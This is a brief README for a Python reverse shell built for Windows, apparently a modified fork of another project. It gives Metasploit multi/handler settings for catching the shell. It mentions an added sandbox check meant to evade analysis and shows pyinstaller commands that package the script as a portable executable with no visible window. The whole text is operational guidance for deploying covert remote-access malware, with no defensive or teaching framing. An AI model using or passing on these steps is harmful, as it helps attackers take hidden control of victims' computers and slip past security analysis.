# Python Reverse Shell For Windows
Reverse Shell written in Python3 - Modified version of trackmastersteve/shell

You can take advantage of post exploitation modules in Metasploit by using:
exploit/multi/handler 
set PAYLOAD linux/shell_reverse_tcp 
            windows/shell_reverse_tcp 
            etc. 

Modified for a less fragile shell and a check for sandbox

To use on Windows, create an executable using pyinstaller

python -m pip install pyinstaller

pyinstaller -wF ./reverse_shell.py


-w removes pop up windows
-F outputs a portable .exe file in the ./dist/ folder
